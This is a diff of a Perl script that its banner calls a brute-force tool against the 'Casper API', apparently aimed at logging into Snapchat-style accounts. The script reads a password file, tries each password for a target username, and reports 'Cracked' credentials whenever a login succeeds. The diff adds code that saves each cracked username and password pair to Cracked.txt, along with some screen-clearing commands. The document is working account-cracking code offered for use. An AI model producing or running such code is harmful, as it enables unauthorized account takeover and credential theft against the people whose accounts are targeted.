@@ -2,7 +2,9 @@
 use LWP::UserAgent; # ppm install LWP::UserAgent
 use JSON::WebToken; # ppm install JSON::WebToken
 ##########################################
+system('clear');
 system('cls');
+system('color 5');
 print qq(
 ################################
 #   [Casper API] BF SC API     #
@@ -32,6 +34,7 @@ chomp($passwords);
 open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
 @PASSS = <PASSFILE>;
 close PASSFILE;
+system('clear');
 system('cls');
 print '
     _   _____  _____   _____    ____    ___       ___     _____   
@@ -76,6 +79,9 @@ chomp $username;
 				);
 			if ($response->content=~ /"logged":true,/) {
 				print "Cracked -> ($username:$password)\n";
+				open(R0T,">>Cracked.txt");
+				print R0T "\n($username:$password)\n";
+				close(R0T);
 				sleep(3);
 			}
 			else
